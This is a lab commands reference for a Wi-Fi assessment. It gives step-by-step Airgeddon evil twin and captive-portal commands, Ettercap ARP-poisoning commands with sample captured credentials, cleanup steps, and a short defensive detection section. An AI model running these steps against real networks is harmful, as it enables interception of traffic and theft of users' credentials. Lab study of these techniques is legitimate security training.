# Commands Reference - Rogue AP & ARP Poisoning Lab

This document contains all commands used during the wireless security assessment lab combining Airgeddon and Ettercap.

**⚠️ DISCLAIMER:** All commands are for educational purposes only in authorized lab environments.

---

## Part 1: Airgeddon - Rogue AP with Captive Portal

### Setup & Launch

#### Clone Airgeddon (if not installed)
```bash
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
```

#### Launch Airgeddon with root privileges
```bash
sudo ./airgeddon.sh
```

---

### Airgeddon Workflow Steps

#### Step 1: Initial Verification
- Root permissions check
- Bash version detection (5.2.21 required minimum)
- Distribution compatibility check
- Essential tools verification

**Expected Tools Status:**
```
Essential tools: checking...
iw .... Ok
awk .... Ok
airmon-ng .... Ok
airodump-ng .... Ok
aircrack-ng .... Ok
xterm .... Ok
ip .... Ok
lspci .... Ok
ps .... Ok
```

#### Step 2: Interface Selection
- Select wireless interface (e.g., wlp5s0)
- Verify monitor mode support

#### Step 3: Main Menu Navigation
```
1. Select another network interface
2. Put interface in monitor mode
3. Put interface in managed mode
---
4. DoS attacks menu
5. Handshake/PMKID/Decloaking tools menu
6. Offline WPA/WPA2 decrypt menu
7. Evil Twin attacks menu  ← SELECT THIS
8. WPS attacks menu
9. WEP attacks menu
10. Enterprise attacks menu
```

#### Step 4: Evil Twin Attacks Menu
```
1. Select another network interface
2. Put interface in monitor mode
3. Put interface in managed mode
4. Explore for targets (monitor mode needed)
---
5. Evil Twin attack just AP
6. Evil Twin AP attack with sniffing
7. Evil Twin AP attack with sniffing and bettercap-sslstrip
8. Evil Twin AP attack with sniffing and bettercap-sslstrip2/BeEF
---
9. Evil Twin AP attack with captive portal (monitor mode needed)  ← SELECT THIS
```

#### Step 5: Target Network Selection
- Scan for available networks
- Filter by WPA/WPA2/WPA3
- Select target by number

**Target Network Example:**
```
BSSID: C4:AD:64:FB:92:CE:66:31
Channel: 36
Encryption: WPA2
ESSID: Excitel_5G_166924376
```

#### Step 6: Attack Configuration
```
Do you want to spoof your MAC address during this attack? [y/N]
> y

Do you already have a captured Handshake file? [y/N]
> y

Set path to file:
> /root/handshake-64:FB:92:CE:66:31.cap
```

#### Step 7: Captive Portal Language Selection
```
Choose the language in which network clients will see the captive portal:
1. English  ← SELECT
2. Spanish
3. French
... (and more)
```

#### Step 8: Attack Execution
- Multiple terminal windows open automatically
- Deauthentication packets sent to legitimate AP
- Rogue AP broadcasts with same SSID
- Victims connect to rogue AP
- DHCP/DNS services activated
- Captive portal serves on 192.168.1.1

---

## Part 2: Ettercap ARP Poisoning

### Pre-Attack Setup

#### Verify network interfaces
```bash
ip a
```

**Output Example:**
```
7: wlp5s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    link/ether 64:fb:92:c4:66:31 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.1/24 scope global wlp5s0
    inet6 fe80::66fb:92ff:fec4:6631/64 scope link
```

#### Enable IP forwarding
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

#### Verify Ettercap installation
```bash
ettercap -v
```

---

### Ettercap Attack Modes

#### Mode 1: Text Mode with Sniffing (Passive)
```bash
sudo ettercap -T -q -i wlp5s0
```

**Flags:**
- `-T` = Text-only interface
- `-q` = Quiet mode (less verbose output)
- `-i` = Interface to use

#### Mode 2: ARP Poisoning - Entire Subnet
```bash
sudo ettercap -T -q -M arp:remote -i wlp5s0
```

**Flags:**
- `-M arp:remote` = Use ARP poisoning, remote mode

#### Mode 3: ARP Poisoning - Specific Targets
```bash
sudo ettercap -T -q -M arp:remote /192.168.1.100// /192.168.1.1// -i wlp5s0
```

**Target syntax:** `/IP_ADDRESS//` (MAC and ports omitted)

#### Mode 4: GUI Mode
```bash
sudo ettercap -G
```

#### Mode 5: Daemon Mode
```bash
sudo ettercap -D -i wlp5s0
```

---

### Ettercap Output Analysis

**Successful Sniffing Output:**
```
ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Listening on:
wlp5s0 -> 64:FB:92:C4:66:31
        192.168.1.1/255.255.255.0
        fe80::66fb:92ff:fec4:6631/64

34 plugins
42 protocol dissectors
```

**Captured Credentials Format:**
```
HTTP : 192.168.1.1:80 -> USER: 8006461030  PASS: Hello@123
INFO: http://192.168.1.1/
CONTENT: username=8006461030&password=Hello%40123
```

---

## Part 3: Cleanup Commands

### Stop Airgeddon
- Press Ctrl+C in main Airgeddon terminal
- All child processes (airbase-ng, dnsmasq, etc.) terminate automatically

### Stop Ettercap
- Press 'q' to quit gracefully
- Or Ctrl+C to force stop

### Disable Monitor Mode
```bash
sudo airmon-ng stop wlp5s0mon
```

### Reset Network Interfaces
```bash
sudo ifconfig wlp5s0 down
sudo ifconfig wlp5s0 up
sudo systemctl restart NetworkManager
```

### Disable IP Forwarding
```bash
echo 0 > /proc/sys/net/ipv4/ip_forward
```

### Clear iptables Rules
```bash
sudo iptables -F
sudo iptables -t nat -F
```

---

## Part 4: Defensive Detection Commands

### Detect Duplicate SSIDs (Evil Twin Detection)
```bash
sudo airodump-ng wlp5s0mon
```
Look for two APs with same SSID but different BSSID.

### Detect ARP Spoofing
```bash
# Check current ARP table
arp -a

# Continuous ARP monitoring
sudo arpwatch -i wlp5s0
```

### Network Scan for Rogue Devices
```bash
sudo arp-scan --interface=wlp5s0 --localnet
```

### Check for unusual DHCP servers
```bash
sudo nmap --script broadcast-dhcp-discover
```

---

## References

- **Airgeddon Repository:** https://github.com/v1s1t0r1sh3r3/airgeddon
- **Ettercap Documentation:** https://www.ettercap-project.org/
- **Aircrack-ng Documentation:** https://www.aircrack-ng.org/
- **Wi-Fi Security Best Practices:** https://www.wi-fi.org/security

---

**Author:** Preeti Deepak Soni  
**Project:** Rogue AP & ARP Poisoning - Wi-Fi Credentials Capture Lab  
**For Educational Purposes Only**
